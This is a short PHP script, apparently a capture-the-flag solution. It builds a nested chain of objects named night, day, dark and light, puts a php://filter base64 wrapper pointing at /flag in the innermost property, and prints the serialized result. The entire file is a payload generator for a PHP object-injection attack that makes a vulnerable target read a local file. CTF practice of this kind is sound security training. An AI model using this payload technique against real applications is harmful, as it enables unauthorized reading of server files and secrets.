<?php
class night{
    public $night;
}
class day{
    public $day;

}
class dark{
    public $dark;
}
class light{
    public $light;
}
$a=new night;
$a->night=new day;
$a->night->day=new dark;
$a->night->day->dark=new light;
$a->night->day->dark->light=new day;
$a->night->day->dark->light->day=new dark ;
$a->night->day->dark->light->day->dark="php://filter/read=convert.base64-encode/resource=/flag";
echo(serialize($a));
